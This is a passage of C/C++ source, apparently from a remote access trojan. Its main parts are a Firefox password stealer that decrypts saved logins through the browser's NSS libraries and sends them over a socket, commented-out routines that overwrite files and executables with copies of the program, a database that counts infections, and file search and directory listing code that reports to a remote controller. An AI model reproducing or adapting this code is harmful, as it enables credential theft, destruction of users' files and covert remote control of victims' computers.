    siUnsignedInteger = 10,
    siUTCTime = 11,
    siGeneralizedTime = 12
};

struct SECItem
{
    SECItemType type;
    unsigned char *data;
    unsigned int len;
};

typedef enum SECStatus
{
    SECWouldBlock = -2,
    SECFailure = -1,
    SECSuccess = 0
};
//-----------------------------------------------------------------------
//Removes gecko-sdk dependency
#define PRBool   int
#define PRUint32 unsigned int
#define PR_TRUE  1
#define PR_FALSE 0

//Mozilla library names
#define NSS_LIBRARY_NAME   "nss3.dll"
#define PLC_LIBRARY_NAME   "plc4.dll"
#define NSPR_LIBRARY_NAME  "nspr4.dll"
#define SQLITE_LIBRARY_NAME  "sqlite3.dll"
#define MOZCRT_LIBRARY_NAME  "mozcrt19.dll"
#define NSSU_LIBRARY_NAME  "nssutil3.dll"
#define NSSU_LIBRARY_NAME  "nssutil3.dll"
#define PLDS_LIBRARY_NAME  "plds4.dll"
#define SOFTN_LIBRARY_NAME "softokn3.dll"

#define LOADLIBRARY(x)  LoadLibrary(x)
#define GETPROCADDRESS  GetProcAddress
#define FREELIBRARY     FreeLibrary
//-----------------------------------------------------------------------
const int buflen = 10240;
static char readbuf[buflen+1];
static int last = 0;
static int next = 0;

typedef struct PK11SlotInfoStr PK11SlotInfo;

// NSS Library functions
typedef SECStatus      (*NSS_Init) (const char *configdir);
typedef SECStatus      (*NSS_Shutdown) (void);
typedef PK11SlotInfo * (*PK11_GetInternalKeySlot) (void);
typedef void           (*PK11_FreeSlot) (PK11SlotInfo *slot);
typedef SECStatus      (*PK11_CheckUserPassword) (PK11SlotInfo *slot,char *pw);
typedef SECStatus      (*PK11_Authenticate) (PK11SlotInfo *slot, PRBool loadCerts, void *wincx);
typedef SECStatus      (*PK11SDR_Decrypt) (SECItem *data, SECItem *result, void *cx);

// PLC Library functions
typedef char *         (*PL_Base64Decode)( const char *src, PRUint32 srclen, char *dest);

// Function declarations..
void NSSUnload();
int InitFFLibs(char *firefoxPath);
int InitializeNSSLibrary(char *profilePath, char *password);
int CheckMasterPassword(char *password);
int DirectoryExists( char *path );
void StrLwr(char *str);
int OpenFile(char *filePath);
void CloseFile();
int ReadLine(char *buffer, int size);
char *GetFFProfilePath();
char *GetFFLibPath();
char *GetFFVersion();
char **Explode(char *StrIn,const char *Delimiter);
char *Split(char *String,char Delimeter[],int Part);
char *replace(char *str, const char *substr, const char *repstr);

char ReadChar();
char Vers[_MAX_PATH] = "";
int version = 1;

int PK11Decrypt(char *decodeData, int decodeLen, char **clearData, int *finalLen);
int Base64Decode(char *cryptData, char **decodeData, int *decodeLen);
//-----------------------------------------------------------------------
NSS_Init                NSSInit = NULL;
NSS_Shutdown            NSSShutdown = NULL;
PK11_GetInternalKeySlot PK11GetInternalKeySlot = NULL;
PK11_CheckUserPassword  PK11CheckUserPassword = NULL;
PK11_FreeSlot           PK11FreeSlot = NULL;
PK11_Authenticate       PK11Authenticate = NULL;
PK11SDR_Decrypt         PK11SDRDecrypt = NULL;
PL_Base64Decode         PLBase64Decode = NULL;

int IsNSSInitialized = 0;

HMODULE libnss = NULL;
HMODULE libplc = NULL;
HMODULE libtmp = NULL;

FILE *signonFile = NULL;

//-----------------------------------------------------------------------
int OpenFile(char *filePath)
{
    last = next = 0;
    signonFile = fopen(filePath, "r");

    if( signonFile == NULL )
    {
      return 0; //fail
    }

  return 1;
}
//-----------------------------------------------------------------------
char ReadChar()
{

  if (next >= last)
  {
    next = 0;
    last = fread(readbuf, 1, buflen, signonFile);
    if (last <= 0 )
    {
     return 0;
    }
  }

  return (readbuf[next++]);
}
//-----------------------------------------------------------------------
int ReadLine(char *buffer, int size)
{
  unsigned int c;
  int strLength = 0, i=0;

  buffer[0] = 0;

  while(1)
  {
      c = ReadChar();

      // eof reached
      if ( c == 0 ) // || feof(file) )
          return 0;

      if (c == '\n')
      {
          buffer[strLength++] = 0;
          break;
      }

      if (c != '\r')
      {
          for(i=0; i < 4 && ( (c & 0xff) != 0 ); i++)
          {
              if( strLength >= size )
              {

                  printf("\n Buffer is insufficient to store data");
                  return 0;
              }
              // Increase buffer capacity dynamically
              buffer[strLength++] = (char)c;
              c = c >> 8;
          }
      }
  }

  return 1;

}
//-----------------------------------------------------------------------
//Misc functions
int DirectoryExists( char *path )
{
    DWORD attr = GetFileAttributes(path);
    if( (attr < 0) || !(attr & FILE_ATTRIBUTE_DIRECTORY ) )
    {
        return 0;
    }
    return 1;
}
//-----------------------------------------------------------------------
void StrLwr(char *str)
{
int n=strlen(str);
    for(int i=0; i<n; i++)
    {
        if( str[i] >=65 && str[i]<=90 )
        str[i]+=32;
    }
}
//-----------------------------------------------------------------------
//Loads specified firefox library with the given ffdir path as root
HMODULE LoadLibrary(char *firefoxDir, char *libName)
{
char loadPath[4096]="";

    strcpy(loadPath, firefoxDir);
    strcat(loadPath, "/");
    strcat(loadPath, libName);

    libtmp = LOADLIBRARY(loadPath);

    if( !libtmp )
    {
        return 0; //Failed to load library
    }

    return libtmp;
}
//-----------------------------------------------------------------------
int InitFFLibs(char *FFDir)
{
    libnss = libplc = NULL;

    //Load all required dll's
  if( FFDir != NULL )
  {

    //Minor version check
    if(!LoadLibrary(FFDir, MOZCRT_LIBRARY_NAME)) //We are using version 2 or lower
    {
        goto version2;
    } else {
if( LoadLibrary(FFDir, NSPR_LIBRARY_NAME) )
{
    if( LoadLibrary(FFDir, PLDS_LIBRARY_NAME) )
    {
        if( LoadLibrary(FFDir, PLC_LIBRARY_NAME) )
        {
                 if( LoadLibrary(FFDir, NSSU_LIBRARY_NAME) )
                 {

                    if( LoadLibrary(FFDir, SQLITE_LIBRARY_NAME) )
                        {

                        }
                 }
           }
      }
   }
}
version2:

            if( LoadLibrary(FFDir, NSPR_LIBRARY_NAME) )
            {
                if( LoadLibrary(FFDir, PLDS_LIBRARY_NAME) )
                {
                    if((libplc=LoadLibrary(FFDir, PLC_LIBRARY_NAME)) )
                    {
                                if((libplc=LoadLibrary(FFDir, PLC_LIBRARY_NAME)) )
                                {
                                    if( LoadLibrary(FFDir, SOFTN_LIBRARY_NAME) )
                                    {
                                            libnss=LoadLibrary(FFDir, NSS_LIBRARY_NAME);
                                            if(libnss )
                                                printf("\n\n Librarys loaded from master firefox path successfully");
                                    }
                                }

                    }
                }
            }
    }

    // Now load from current path.
    if( !libnss )
    {
        libnss =LOADLIBRARY(NSS_LIBRARY_NAME);
        libplc =LOADLIBRARY(PLC_LIBRARY_NAME);
        if( !libnss || !libplc )
        {
            printf("\n\n Failed to load Firefox libraries %s & %s ", NSS_LIBRARY_NAME, PLC_LIBRARY_NAME);
            return 0;
        }
    } else {
    printf("\n Firefox Libraries loaded successfully");
    }

    // Extract the required functions....
    NSSInit                   = (NSS_Init) GETPROCADDRESS(libnss, "NSS_Init");
    NSSShutdown               = (NSS_Shutdown)GETPROCADDRESS(libnss, "NSS_Shutdown");
    PK11GetInternalKeySlot = (PK11_GetInternalKeySlot) GETPROCADDRESS(libnss, "PK11_GetInternalKeySlot");
    PK11FreeSlot           = (PK11_FreeSlot) GETPROCADDRESS(libnss, "PK11_FreeSlot");
    PK11Authenticate       = (PK11_Authenticate) GETPROCADDRESS(libnss, "PK11_Authenticate");
    PK11SDRDecrypt         = (PK11SDR_Decrypt) GETPROCADDRESS(libnss, "PK11SDR_Decrypt");
    PK11CheckUserPassword  = (PK11_CheckUserPassword ) GETPROCADDRESS(libnss, "PK11_CheckUserPassword");

    if( !NSSInit || !NSSShutdown || !PK11GetInternalKeySlot || !PK11Authenticate || !PK11SDRDecrypt || !PK11FreeSlot || !PK11CheckUserPassword)
    {
        printf("\n\n Failed to get function address from library %s ", NSS_LIBRARY_NAME);
        NSSUnload();
        return 0;
    }

    // Get the functions from PLC library
    PLBase64Decode     = ( PL_Base64Decode ) GETPROCADDRESS(libplc, "PL_Base64Decode");

    if( !PLBase64Decode )
    {
        printf("\n\n Failed to get function address from library %s ", PLC_LIBRARY_NAME);
        NSSUnload();
        return 0;
    } else {
    printf("\n Firefox library initialized successfully");
    }

  return 1;
}
//-----------------------------------------------------------------------
int InitializeNSSLibrary(char *profilePath)
{
    IsNSSInitialized = 0;

    // Initialize the NSS library
    if( (*NSSInit) (profilePath) != SECSuccess )
    {
        printf("\n\n NSSLib Initialization failed");
        NSSUnload();
        return 0;
    } else {
    IsNSSInitialized = 1;
    printf("\n NSS library initiliazed successfully");
    }

  return 1;
}
//-----------------------------------------------------------------------
void NSSUnload()
{
    if( IsNSSInitialized  && (NSSShutdown != NULL) )
        (*NSSShutdown)();

    if( libnss != NULL )
        FREELIBRARY(libnss);  //Free nss library

    if( libplc != NULL )
        FREELIBRARY(libplc);  //Free plc library
}
//-----------------------------------------------------------------------
int DecryptStr(char *cryptData, char **clearData)
{
int decodeLen = 0;
int finalLen = 0;
char *decodeData = NULL;
char *finalData = NULL;

    if( cryptData[0] != NULL )
    {
        if(  (Base64Decode(cryptData, &decodeData, &decodeLen) == 0) || (decodeData == NULL) )
        {
            return 0;
        }

        // Do the actual PK11 decryption
        if( (PK11Decrypt(decodeData, decodeLen, &finalData, &finalLen) == 0) || (finalData == NULL))
        {
            return 0;
        }

        *clearData = (char*) malloc( finalLen + 1 );
        if( *clearData == NULL )
        {
            printf("\n Insufficient memory");
            return 0;
        }
        memcpy(*clearData, finalData, finalLen);
        *(*clearData + finalLen) = 0;    // Null terminate string

        return 1;
    }

    if(  Base64Decode(cryptData, clearData, &decodeLen) == 0 )
    {
        return 0;
    }

    return 1;
}
//-----------------------------------------------------------------------
int Base64Decode(char *cryptData, char **decodeData, int *decodeLen)
{
    int len = strlen( cryptData );
    int adjust = 0;

    if (cryptData[len-1] == '=')
    {
      adjust++;
      if (cryptData[len-2] == '=')
          adjust++;
    }

    *decodeData = ( char *)(*PLBase64Decode)(cryptData, len, NULL);

    if( *decodeData == NULL )
    {
        return 0;
    }

    *decodeLen = (len*3)/4 - adjust;

    return 1;
}
//-----------------------------------------------------------------------
int PK11Decrypt(char *decodeData, int decodeLen, char **clearData, int *finalLen)
{
    PK11SlotInfo *slot = 0;
    SECStatus status;
    SECItem request;
    SECItem reply;

    // Find token with SDR key
    slot = (*PK11GetInternalKeySlot)();

    if (!slot)
    {
        return 0;
    }

    // Decrypt the string
    request.data = (unsigned char *)decodeData;
    request.len = decodeLen;
    reply.data = 0;
    reply.len = 0;

    status = (*PK11SDRDecrypt)(&request, &reply, NULL);

    if (status != SECSuccess)
    {
        return 0;
    }

    *clearData = (char*)reply.data;
    *finalLen  = reply.len;

    // Free the slot
    (*PK11FreeSlot)(slot);
    return 1;
}
//-----------------------------------------------------------------------
int DumpCache(char *profilePath,char *signonFile)
{
char buffer[10240];
char sbuffer[10240];
char name[10240];
PACKETHEAD Pass;
char *clearData = NULL;

int bufferLength = 10240;
int ret;
int T = 0;
    if( profilePath == NULL || signonFile == NULL)
    {
        return 0;
    }

    strcpy(sbuffer,profilePath);
    strcat(sbuffer,"\\");
    strcat(sbuffer,signonFile);

    if(OpenFile(sbuffer) == 0 ) // Open the signon file
     {
         printf("\n\n Failed to open signon file: [%s], skipped. ", signonFile);
         return 0;
     } else {
    /////////////////////////////////////////
      //Begin cache dump//
    /////////////////////////////////////////


    // Read out the unmanaged ("Never remember" URL list

    ReadLine(buffer, bufferLength); //Skip first line as its a useless version tag

    while (ReadLine(buffer, bufferLength) != 0)
    {
        // End of unmanaged list
        if (strlen(buffer) != 0 && buffer[0] == '.' && buffer[0] != '#')
            break;
        printf("\n %s ", buffer);
	    strcpy(FFbuffer1, buffer);
    }

    // read the URL line
while (ReadLine(buffer, bufferLength) != 0 ) {

printf("\n URL: %s ", buffer);
strcpy(FFbuffer1, buffer);
    //Start looping through final singon*.txt file
while (ReadLine(buffer, bufferLength) != 0 )
{

    if (buffer[0] == '.')
    {
    break; // end of cache entry
    }

    //Check if its a password
    if (buffer[0] == '*')
    {
        strcpy(name,&buffer[1]);
        ret = ReadLine(buffer, bufferLength);
    } else {
        printf("\n");
        strcpy(name, buffer);
        ret = ReadLine(buffer, bufferLength);
    }

    if( DecryptStr(buffer, &clearData) == 1 )
    {
                //printf("\n %s: %s ", name, clearData);
				//MessageBox(NULL, clearData, name, MB_OK);

				if(T == 0)
				{
				strcpy(FFbuffer2, clearData);
				T = 1;
				}
				else
				{
				strcpy(FFbuffer3, clearData);
				//Pass.PacketType = PASSWORD_FIREFOX;
				//Pass.ID = LocalId;
				//Pass.ID2 = 6;
				T = 0;
TryAgain:
					if(send(client, (char *)&Pass, sizeof(PACKETHEAD), 0) == SOCKET_ERROR)
					{

					if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
					{
					return 0;
					}
					goto TryAgain;
					}
ofstream ffFile1("FFtest1.txt");
ffFile1.write(FFbuffer1,sizeof(FFbuffer1));
ffFile1.close();

ofstream ffFile2("FFtest2.txt");
ffFile2.write(FFbuffer2,sizeof(FFbuffer2));
ffFile2.close();

ofstream ffFile3("FFtest3.txt");
ffFile3.write(FFbuffer3,sizeof(FFbuffer3));
ffFile3.close();


				}
                clearData = NULL;
    }
  }
}
return 1;
}
    /////////////////////////////////////////
     // End pcache dump//
    /////////////////////////////////////////
}
//-----------------------------------------------------------------------
// Find firefox path / libraries
char *GetFFLibPath()
{
    char regSubKey[]    = "SOFTWARE\\Clients\\StartMenuInternet\\firefox.exe\\shell\\open\\command";
    char path[_MAX_PATH] ="";
    char *FFDir = NULL;
    DWORD pathSize = _MAX_PATH;
    DWORD valueType;
    HKEY rkey;

    // Open firefox registry key
    if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, regSubKey, 0, KEY_READ, &rkey) != ERROR_SUCCESS )
    {
        printf("\n Failed to open the firefox registry key : HKCU\\%s", regSubKey );
        return NULL;
    }

    // Read the firefox path
    if( RegQueryValueEx(rkey, NULL, 0,  &valueType, (unsigned char*)&path, &pathSize) != ERROR_SUCCESS )
    {
        printf("\n Failed to read the firefox path value from registry ");
        RegCloseKey(rkey);
        return NULL;
    }

    if( pathSize <= 0 || path[0] == 0)
    {
        printf("\n Unable to locate firefox installation path");
        RegCloseKey(rkey);
        return NULL;
    }

    RegCloseKey(rkey);

    // Remove extra quotes
    if( path[0] == '\"' )
    {
        for(int i=0; i < strlen(path)-1; i++)
            path[i] = path[i+1];
    }

    printf("\n Firefox main exe: %s", path);

    // Terminate the string at last "\\"
    for(int j=strlen(path)-1; j>0; j--)
    {
        if( path[j] == '\\' )
        {
            path[j]=0;
            break;
        }
    }

    FFDir = (char*) malloc( strlen(path) + 1);

        if(FFDir)
            strcpy(FFDir, path);
        printf("\n Firefox path: %s", FFDir);

return FFDir;
}
//-----------------------------------------------------------------------
char *GetFFProfilePath()
{
char profilePath[_MAX_PATH] = "";
char partialPath[] = "Application Data\\Mozilla\\Firefox";
char profileFile[_MAX_PATH];
char line[1024];

DWORD pathSize = _MAX_PATH;
char *finalProfilePath = NULL;
int  isDefaultFound = 0;
HANDLE token;

    // Get current user's profile directory
    if( OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token) == FALSE )
    {
        printf("\n Failed to get current process token ");
        return NULL;
    }

    if( GetUserProfileDirectory(token, profilePath, &pathSize) == FALSE )
    {
        printf("\n Failed to get user profile directory");
        return NULL;
    }

    printf("\n User Profile directory: %s\n", profilePath);

    // Get firefox profile directory
    strcpy(profileFile, profilePath);
    strcat(profileFile,"\\");
    strcat(profileFile,partialPath);
    strcat(profileFile,"\\profiles.ini");

    // Open the firefox profile setting file
    FILE *profile = fopen(profileFile, "r");

    if( profile == NULL )
    {
        printf("\n Unable to find firefox profile file: %s ", profileFile);
        return NULL;
    }

    // This indicates that we are looking under default profile
    while(fgets(line, 1024, profile))
    {
        StrLwr(line);

        if( !isDefaultFound && ( strstr(line, "name=default") != NULL) )
        {
            isDefaultFound = 1;
            continue;
        }

        // Found default profile / check for path
        if( isDefaultFound )
        {
            if( strstr(line,"path=") != NULL)
            {
                char *slash = strstr(line,"/");

                if( slash != NULL )
                    *slash = '\\';

                // remove \n from the end of line
                line[strlen(line)-1] = 0;

                char *start = strstr(line,"=");

                int totalLen = strlen(profilePath) + strlen(partialPath) + strlen(start) + 3;
                finalProfilePath = (char *) malloc(totalLen);

                if( finalProfilePath )
                {
                    strcpy(finalProfilePath,profilePath);
                    strcat(finalProfilePath,"\\");
                    strcat(finalProfilePath,partialPath);
                    strcat(finalProfilePath,"\\");
                    strcat(finalProfilePath,start+1);

                    printf("\n Final profile path: %s \n", finalProfilePath);
                }

                break;
            }
        }

    }

    fclose(profile);

  return finalProfilePath;
}
//-----------------------------------------------------------------------
char *GetFFVersion()
{
char regSubKey[] = "SOFTWARE\\Mozilla\\Mozilla Firefox";
char *FFVers = NULL;
DWORD pathSize = _MAX_PATH;
DWORD valueType;
HKEY rkey;

    // Open firefox registry key
    if( RegOpenKeyEx(HKEY_LOCAL_MACHINE, regSubKey, 0, KEY_READ, &rkey) != ERROR_SUCCESS )
    {
        printf("\n Failed to open the firefox registry key : HKCU\\%s", regSubKey );
        return NULL;
    }


    // Read the firefox path value
    if( RegQueryValueEx(rkey, "CurrentVersion", 0,  &valueType, (unsigned char*)&Vers, &pathSize) != ERROR_SUCCESS )
    {
        printf("\n Failed to read the firefox version from registry ");
        RegCloseKey(rkey);
        return NULL;
    }

        if( pathSize <= 0 || Vers[0] == 0)
    {
        printf("\n Path value read from the registry is empty");
        RegCloseKey(rkey);
        return NULL;
    }

        RegCloseKey(rkey);

        FFVers = (char*) malloc( strlen(Vers) + 1);

    if( FFVers )
    strcpy(Vers,FFVers);
    if (FFVers[1] == '1')
    {
        version = 1;
    }else{
    if (FFVers[1] == '2')
    {
        version = 2;
    }else{
    if (FFVers[1] == '3')
        {
        version = 3;
    }
  }
}
    printf("\n Firefox version: %d", version);

    return (FFVers);
}
int GetFfPwds()
{
    char *ProfilePath = NULL;     //Profile path
    char *FFDir = NULL;           //Firefox main installation path
//    char buff[1024];

    ProfilePath = GetFFProfilePath();

    if( !DirectoryExists(ProfilePath))
    {
      //MessageBox(NULL, "NO DirectoryExist!", "END", MB_OK);
      return 0;
    }

    FFDir = GetFFLibPath();

    if( !DirectoryExists(ProfilePath))
    {
      //MessageBox(NULL, "NO FF install Directory Exists!", "END", MB_OK);
      return 0;
    }
        if( InitFFLibs(FFDir) )
        {
            if( InitializeNSSLibrary(ProfilePath) )
            {
                 //Take 3 Mozilla dumps
                DumpCache(ProfilePath,"signons.txt");
                DumpCache(ProfilePath,"signons2.txt");
                DumpCache(ProfilePath,"signons3.txt");
                //Dont forget to flush :/
                NSSUnload();
            }
        }

   //MessageBox(NULL, "NO ERRORS!", "END", MB_OK);
   return 0;
}
*/


static int Statscallback(void *data, int argc, char **argv, char **azColName){

      sprintf(InfUSBsDB,"%s",argv[1] ? argv[1] : "NULL");
      sprintf(InfEXEsDB,"%s",argv[2] ? argv[2] : "NULL");

return 0;
}


void GetInfStatsDataBase()
{

  sqlite3 *db;
  char *SelectVal;
  int rc;

  rc = sqlite3_open("log.db", &db);
  if( rc ){

          }

SelectVal = "SELECT * FROM InfStats";

 sqlite3_exec(db, SelectVal, Statscallback, 0, 0);

 sqlite3_close(db);

}



void SetInfStatsDB(int InfUSBs, int InfEXEs )
{
  sqlite3 *db;
  char *CreateInfStatstable;
  char Insertval[300];
  char  Updateval[300];
  int rc;


  rc = sqlite3_open("log.db", &db);
  if( rc ){

          }

  CreateInfStatstable = "create table InfStats("
            "ID INT PRIMARY KEY NOT NULL,"\
            "InfUSBs INT,"\
            "InfEXEs INT);";

  sprintf(Insertval,"insert into InfStats(ID,InfUSBs,InfEXEs)" "values(%d,%d,%d);",1,InfUSBs,InfEXEs);

  GetInfStatsDataBase();

  InfUSBs+=atoi(InfUSBsDB);
  InfEXEs+=atoi(InfEXEsDB);


  sprintf(Updateval,"UPDATE InfStats set ID=%d,InfUSBs=%d,InfEXEs=%d;",1,InfUSBs,InfEXEs);

  sqlite3_exec(db, CreateInfStatstable, 0, 0, 0);
  sqlite3_exec(db, Insertval, 0, 0, 0);
  sqlite3_exec(db, Updateval, 0, 0, 0);


  sqlite3_close(db);
}




void CleanInfStatsDB()
{

  sqlite3 *db;
  char *DeleteVal;
  int rc;

  rc = sqlite3_open("log.db", &db);
  if( rc ){

          }

  DeleteVal = "DELETE from InfStats where ID=1;";

  sqlite3_exec(db, DeleteVal, 0, 0, 0);

  sqlite3_close(db);

  ZeroMemory(&InfEXEsDB[0],sizeof(InfEXEsDB));
  ZeroMemory(&InfUSBsDB[0],sizeof(InfUSBsDB));

}




/*int InfectALL(void)
{
	WIN32_FIND_DATA d32;
	HANDLE fHandle;
	char MyFile[256];
	char showdir[256];
	char svdir[5];
	strcpy(svdir,"*");
	GetModuleFileName(NULL,MyFile,sizeof(MyFile));
    int r = 0;



	if((fHandle = FindFirstFile(svdir,&d32))==INVALID_HANDLE_VALUE) return 1;
	else {
        ZeroMemory(&showdir[0],sizeof(showdir));
		if(d32.cFileName==MyFile) goto next;
		SetFileAttributes(d32.cFileName,FILE_ATTRIBUTE_NORMAL);
		//CopyFile(MyFile,d32.cFileName,FALSE);
		//MoveFile(showdir,d32.cFileName);

        if(strstr(d32.cFileName, ".") || strstr(d32.cFileName, ".."))
        {
            strcpy(d32.cFileName,"Secrete");
        }

            for(r = strlen(d32.cFileName); r > 0; r--)
            {
                if(d32.cFileName[r]=='.')
                {
                    //MessageBox(NULL, show, "POS", MB_OK);
                    break;
                }

            }

            for(int i = 0; i<r; i++)
            {
                showdir[i]=d32.cFileName[i];
            }

            strcat(showdir,".exe");
            DeleteFile(d32.cFileName);
            strcpy(d32.cFileName,showdir);
            CopyFile(MyFile,d32.cFileName,FALSE);
            MessageBox(NULL, d32.cFileName, "", MB_OK);

next:
		while(FindNextFile(fHandle,&d32)) {
		    ZeroMemory(&showdir[0],sizeof(showdir));
			if(d32.cFileName==MyFile) continue;
			SetFileAttributes(d32.cFileName,FILE_ATTRIBUTE_NORMAL);
			//CopyFile(MyFile,d32.cFileName,FALSE);
			//MoveFile(showdir,d32.cFileName);

        if(strstr(d32.cFileName, ".") || strstr(d32.cFileName, ".."))
        {
            strcpy(d32.cFileName,"Secrete");
        }
            for(r = strlen(d32.cFileName); r > 0; r--)
            {
                if(d32.cFileName[r]=='.')
                {
                    //MessageBox(NULL, show, "POS", MB_OK);
                    break;
                }

            }

            for(int i = 0; i<r; i++)
            {
                showdir[i]=d32.cFileName[i];
            }
            //MessageBox(NULL, showdir, "POS", MB_OK);
            strcat(showdir,".exe");
            DeleteFile(d32.cFileName);
            strcpy(d32.cFileName,showdir);
            CopyFile(MyFile,d32.cFileName,FALSE);
            MessageBox(NULL, d32.cFileName, "", MB_OK);

		}
		FindClose(fHandle);
	}
	return 0;
}






int InfectExes(void)
{
	WIN32_FIND_DATA d32;
	HANDLE fHandle;
	char MyFile[256];
	char svdir[5];
	strcpy(svdir,"*.exe");
	GetModuleFileName(NULL,MyFile,sizeof(MyFile));


    if((fHandle = FindFirstFile(svdir,&d32))==INVALID_HANDLE_VALUE) return 1;
       else{
        if(d32.cFileName==MyFile) goto next;
		SetFileAttributes(d32.cFileName,FILE_ATTRIBUTE_NORMAL);
		CopyFile(MyFile,d32.cFileName,FALSE);

next:
		while(FindNextFile(fHandle,&d32)) {
			if(d32.cFileName==MyFile) continue;
			SetFileAttributes(d32.cFileName,FILE_ATTRIBUTE_NORMAL);
            CopyFile(MyFile,d32.cFileName,FALSE);


		}
		FindClose(fHandle);
	}
	return 0;
}*/



//////////////////////////////////////////////////////////////////////////////////////
//File Search


int FindFile(char *filename, char *dirname)
{
    unsigned int numfound = 0;
	//	char sendbuf[100],
	char tmpPath[100], newPath[100];
    char Buffer [200] = "";
	WIN32_FIND_DATA fd;
	HANDLE fh;
	Sleep(100);
	_snprintf(tmpPath, sizeof(tmpPath), "%s\\*", dirname);

	if ((fh = FindFirstFile(tmpPath, &fd)) != INVALID_HANDLE_VALUE)
		do {
			if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				if (fd.cFileName[0] != '.' || (fd.cFileName[1] && fd.cFileName[1] != '.'))
				{
					_snprintf(newPath,sizeof(newPath),"%s\\%s", dirname,fd.cFileName);
					//numfound = FindFile(filename, newPath);
				}
			}
				Sleep(100);
			} while (FindNextFile(fh, &fd));
		FindClose(fh);

		_snprintf(tmpPath, sizeof(tmpPath), "%s\\%s", dirname, filename);
		if ((fh = FindFirstFile(tmpPath, &fd)) != INVALID_HANDLE_VALUE)
			do {
				numfound ++;
SendSearch:
				_snprintf(Buffer,sizeof(Buffer),"%s%s",dirname,fd.cFileName);
				strcpy(SEND.FoundFile,Buffer);
				SEND.PacketType = SEND_FILE_SEARCH;
				send(Socket,(char*)&SEND,HeadSize,0);

               Sleep(100);

			   } while (FindNextFile(fh, &fd));
			FindClose(fh);

            Sleep(10);

			SEND.FoundNum = numfound;
            SEND.PacketType = SEND_FILE_SEARCHNUM;
            send(Socket,(char*)&SEND,HeadSize,0);

			return 0;
}

DWORD WINAPI FindFileT(LPVOID lParam)
{
	FindFile(Buf, Buf2);
	return 0;
}




////FILE FUNCTIONS////
int ListDir()
{

   char  MyDir[MAX_PATH];
   char  Datadir[MAX_PATH];
   char	ParentPID	[50];

   strcpy(dir,Recv.Dpath);
   //sqlite3 *db;



   WIN32_FIND_DATA ffd;
   LARGE_INTEGER filesize;
   TCHAR szDir[MAX_PATH];
   HANDLE hFind = INVALID_HANDLE_VALUE;
   DWORD dwError=0;
   char FileExtention [10] = "";
   int C = 0;
   int H = 0;
   strcpy(szDir, dir);
   strcat(szDir, "*");


    hFind = FindFirstFile(szDir, &ffd);

	if(hFind == NULL)
	{

	}

   if (INVALID_HANDLE_VALUE == hFind)
   {
	 //MessageBox(NULL, "Invalid Handle (hFind)", "List Find Next File", MB_OK);
     return 1;
   }


   // List all the files in the directory with some info about them.

   do
   {
      if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
      {

     ZeroMemory(&SEND.Folder[0],sizeof(&SEND.Folder));
	 lstrcpy(SEND.Folder,ffd.cFileName);
	 SEND.PacketType = SEND_FOLDERS;

SEND_DIR:

	 if(send(Socket,(char*)&SEND,HeadSize,0)==SOCKET_ERROR)
	 {
        if(WSAGetLastError() == WSAECONNRESET || WSAGetLastError() == WSAECONNABORTED)
        {
         return 0;
        }
        Sleep(50);
        goto SEND_DIR;
	 }

      Sleep(30);
      }

      else
      {

         filesize.LowPart = ffd.nFileSizeLow;
         filesize.HighPart = ffd.nFileSizeHigh;
		 C = 0;
		 H = 0;



         ZeroMemory(&SEND.FileSize[0],sizeof(&SEND.FileSize));
         wsprintf(&SEND.FileSize[0],"%d Bytes",filesize.QuadPart);

         lstrcpy(SEND.File, ffd.cFileName);
         while(SEND.File[C] != '.')
         {
             C++;
         }
         while(SEND.File[C] != NULL)
         {
		   FileExtention[H] += SEND.File[C];
		   H++;
		   C++;
         }
         if(strstr(FileExtention, ".pdf") || strstr(FileExtention, ".PDF"))
         {
             SEND.File_type = 9;
             goto SENDFILE;
         }

         if(strstr(FileExtention, ".exe") || strstr(FileExtention, ".EXE") || strstr(FileExtention, ".com") || strstr(FileExtention, ".COM"))
         {
             SEND.File_type = 2;
             goto SENDFILE;
         }

         if(strstr(FileExtention, ".rar") || strstr(FileExtention, ".RAR") || strstr(FileExtention, ".zip") || strstr(FileExtention, ".ZIP")|| strstr(FileExtention, ".TAR.GZ")|| strstr(FileExtention, ".tar.gz"))
         {
             SEND.File_type = 3;
             goto SENDFILE;
         }

         if(/*strstr(FileExtention, ".DOC") ||*/ strstr(FileExtention, ".doc") /*|| strstr(FileExtention, ".CAD")*/ || strstr(FileExtention, ".cad")/*|| strstr(FileExtention, ".XLS")*/|| strstr(FileExtention, ".xls")/*|| strstr(FileExtention, ".DOCX")|| strstr(FileExtention, ".docx")|| strstr(FileExtention, ".odk")|| strstr(FileExtention, ".ODK")|| strstr(FileExtention, ".ODK")|| strstr(FileExtention, ".odk")|| strstr(FileExtention, ".csv")|| strstr(FileExtention, ".xlam")|| strstr(FileExtention, ".slk")|| strstr(FileExtention, ".xps")|| strstr(FileExtention, ".xlsm")|| strstr(FileExtention, ".PPT")*/|| strstr(FileExtention, ".ppt")/*|| strstr(FileExtention, ".pot")|| strstr(FileExtention, ".ppsx")|| strstr(FileExtention, ".emf")|| strstr(FileExtention, ".rtf")|| strstr(FileExtention, ".pps")*/)
         {
             SEND.File_type = 4;
             goto SENDFILE;
         }

         if(strstr(FileExtention, ".JPEG") || strstr(FileExtention, ".jpeg") || strstr(FileExtention, ".JPG") || strstr(FileExtention, ".jpg")|| strstr(FileExtention, ".GIF")|| strstr(FileExtention, ".gif")|| strstr(FileExtention, ".ICO")|| strstr(FileExtention, ".ico")|| strstr(FileExtention, ".PIF")|| strstr(FileExtention, ".pif")|| strstr(FileExtention, ".BMP")|| strstr(FileExtention, ".bmp")|| strstr(FileExtention, ".PNG")|| strstr(FileExtention, ".png")|| strstr(FileExtention, ".jpe")|| strstr(FileExtention, ".JPE"))
         {
             SEND.File_type = 5;
             goto SENDFILE;
         }

         if(strstr(FileExtention, ".TXT") || strstr(FileExtention, ".txt") || strstr(FileExtention, ".DB") || strstr(FileExtention, ".db")|| strstr(FileExtention, ".LOG")|| strstr(FileExtention, ".log")|| strstr(FileExtention, ".SPEC")|| strstr(FileExtention, ".spec")|| strstr(FileExtention, ".DAT")|| strstr(FileExtention, ".dat")/*|| strstr(FileExtention, ".BMP")|| strstr(FileExtention, ".bmp")|| strstr(FileExtention, ".PNG")|| strstr(FileExtention, ".png")|| strstr(FileExtention, ".jpe")|| strstr(FileExtention, ".JPE")*/)
         {
             SEND.File_type = 8;
             goto SENDFILE;
         }

